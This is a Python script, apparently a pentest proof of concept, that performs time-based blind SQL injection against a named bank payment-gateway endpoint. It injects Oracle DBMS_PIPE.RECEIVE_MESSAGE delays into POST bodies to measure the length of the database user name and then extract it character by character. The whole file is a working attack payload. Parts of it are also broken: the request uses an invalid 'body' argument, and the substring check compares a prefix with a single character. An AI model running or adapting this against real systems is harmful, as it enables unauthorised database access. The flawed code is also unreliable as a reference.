import requests
from datetime import datetime


url = "https://ecommerce-preuat.qnb.com/ipg/servlet_ipgmisc"
cookie = {"JSESSIONID":"xx"}


abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=\{\}[]|;:'\",.<>/?`~"





def getLenght():

	for i in range(0,30):
		payload = "All') AND 1337=(CASE WHEN LENGTH(user)=" +  str(i) + " THEN DBMS_PIPE.RECEIVE_MESSAGE('secforce',5) END) AND ('Secforce'='Secforce"
		body = "whatever" + payload
		before = datetime.now()
		res = requests.post(url, cookies=cookie, body=body)
		after = datetime.now()

		time_difference = after - before
		days = time_difference.days
		seconds = time_difference.seconds
		microseconds = time_difference.microseconds
		total_seconds = days * 24 * 60 * 60 + seconds + microseconds / 1e6

		# Check if the time difference is greater than 5 seconds (triggered sqli)
		if total_seconds > 5:
			return i


def getData(length):
	for i in range(1,length):
		for j in abc:
			payload = "All') AND 1337=(CASE WHEN SUBSTR(user,1," + str(i) + ")='" +  str(j) + "' THEN DBMS_PIPE.RECEIVE_MESSAGE('secforce',5) END) AND ('Secforce'='Secforce"
			body = "whatever" + payload
			before = datetime.now()
			res = requests.post(url, cookies=cookie, body=body)
			after = datetime.now()

			time_difference = after - before
			days = time_difference.days
			seconds = time_difference.seconds
			microseconds = time_difference.microseconds
			total_seconds = days * 24 * 60 * 60 + seconds + microseconds / 1e6

			# Check if the time difference is greater than 5 seconds (triggered sqli)
			if total_seconds > 5:
				print("New char found: " + str(j))
				break


length = getLenght()
getData(length)